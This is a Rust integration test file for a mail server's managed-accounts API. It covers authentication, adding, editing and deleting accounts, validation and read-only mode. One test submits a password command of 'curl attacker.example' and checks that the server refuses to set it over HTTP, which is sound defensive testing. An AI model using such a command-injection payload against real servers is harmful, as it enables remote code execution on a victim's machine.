mod support;

use serde_json::{json, Value};
use support::Server;

/// Managed mode being *off* is a state the client shows, not an error it
/// handles. A server that answered 404 or 500 here would have every client
/// reporting a broken server to somebody whose setup is entirely fine.
#[tokio::test]
async fn a_self_managed_server_answers_that_it_manages_nothing() {
    let Some(server) = Server::start().await else {
        return;
    };

    let response = server.get("/api/v1/managed").await;
    assert_eq!(response.status(), 200);

    let view: Value = response.json().await.unwrap();
    assert_eq!(view["managing"].as_array().unwrap().len(), 0);
    assert_eq!(view["accounts"]["account"].as_object().unwrap().len(), 0);
    assert!(view["files"].as_array().unwrap().is_empty());
}

#[tokio::test]
async fn the_managed_routes_need_a_token_like_everything_else() {
    let Some(server) = Server::start().await else {
        return;
    };

    assert_eq!(server.anonymous("/api/v1/managed").await.status(), 401);
}

/// The whole reason these routes are in their own module. A password command is
/// a command *this server* would run, and the credential to reach these routes
/// is a bearer token on a phone. It is refused, and the refusal names where the
/// setting can legitimately be made.
#[tokio::test]
async fn a_password_command_cannot_be_set_over_http() {
    let Some(server) = Server::start().await else {
        return;
    };

    let response = server
        .post(
            "/api/v1/managed/accounts",
            json!({
                "id": "evil",
                "address": "someone@example.com",
                "provider": "generic",
                "auth": { "kind": "command", "command": ["curl", "attacker.example"] },
                "imap": { "host": "imap.example.com", "port": 993, "tls": "implicit" },
                "smtp": { "host": "smtp.example.com", "port": 587, "tls": "starttls" }
            }),
        )
        .await;

    assert_eq!(response.status(), 400);
    let body: Value = response.json().await.unwrap();
    assert!(
        body["detail"].as_str().unwrap().contains("ecr account"),
        "the refusal must name where it can be done: {body}"
    );
}

#[tokio::test]
async fn an_account_can_be_added_edited_and_removed_over_the_api() {
    let Some(server) = Server::start().await else {
        return;
    };

    // Managed mode has to be on first, or there is nowhere for it to land.
    let response = server
        .put(
            "/api/v1/managed/management",
            json!({ "package": "mbsync", "management": "ecr" }),
        )
        .await;
    assert_eq!(response.status(), 200);

    // And a maildir root, which the API deliberately refuses to invent.
    server.write_accounts_file();

    let response = server
        .post(
            "/api/v1/managed/accounts",
            json!({
                "id": "work",
                "address": "someone@corp.example",
                "provider": "outlook",
                "auth": { "kind": "oauth", "profile": "work" },
                "primary": true
            }),
        )
        .await;
    assert_eq!(response.status(), 200, "{:?}", response.text().await);

    let view: Value = server.get("/api/v1/managed").await.json().await.unwrap();
    assert_eq!(
        view["accounts"]["account"]["work"]["address"],
        "someone@corp.example"
    );
    assert!(view["managing"]
        .as_array()
        .unwrap()
        .contains(&json!("mbsync")));

    // The file was regenerated as part of the write, rather than left for an
    // apply the client has no way to know it owes.
    let isyncrc = view["files"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["kind"] == "mbsync")
        .expect("no mbsync file");
    assert_eq!(isyncrc["state"], "current");
    assert!(std::fs::read_to_string(isyncrc["path"].as_str().unwrap())
        .unwrap()
        .contains("someone@corp.example"));

    let response = server
        .put(
            "/api/v1/managed/accounts/work",
            json!({
                "id": "work",
                "address": "moved@corp.example",
                "provider": "outlook",
                "auth": { "kind": "oauth", "profile": "work" }
            }),
        )
        .await;
    assert_eq!(response.status(), 200);

    let view: Value = server.get("/api/v1/managed").await.json().await.unwrap();
    assert_eq!(
        view["accounts"]["account"]["work"]["address"],
        "moved@corp.example"
    );

    assert_eq!(
        server
            .delete("/api/v1/managed/accounts/work")
            .await
            .status(),
        200
    );
    let view: Value = server.get("/api/v1/managed").await.json().await.unwrap();
    assert!(view["accounts"]["account"]["work"].is_null());
}

#[tokio::test]
async fn an_account_with_no_address_is_refused_with_the_reason() {
    let Some(server) = Server::start().await else {
        return;
    };
    server.write_accounts_file();

    let response = server
        .post(
            "/api/v1/managed/accounts",
            json!({
                "id": "broken",
                "address": "not-an-address",
                "provider": "gmail",
                "auth": { "kind": "oauth", "profile": "broken" }
            }),
        )
        .await;

    assert_eq!(response.status(), 400);
    let body: Value = response.json().await.unwrap();
    assert!(
        body["detail"].as_str().unwrap().contains("email address"),
        "{body}"
    );
}

/// Every other write route refuses in `--read-only`, and reconfiguring where
/// mail is fetched from is the last one that should be an exception.
#[tokio::test]
async fn a_read_only_server_refuses_to_change_the_accounts() {
    let Some(server) = Server::start_read_only().await else {
        return;
    };

    let response = server
        .post(
            "/api/v1/managed/accounts",
            json!({
                "id": "work",
                "address": "someone@corp.example",
                "provider": "outlook",
                "auth": { "kind": "oauth", "profile": "work" }
            }),
        )
        .await;
    assert_eq!(response.status(), 400);

    // Reading is still fine.
    assert_eq!(server.get("/api/v1/managed").await.status(), 200);
}
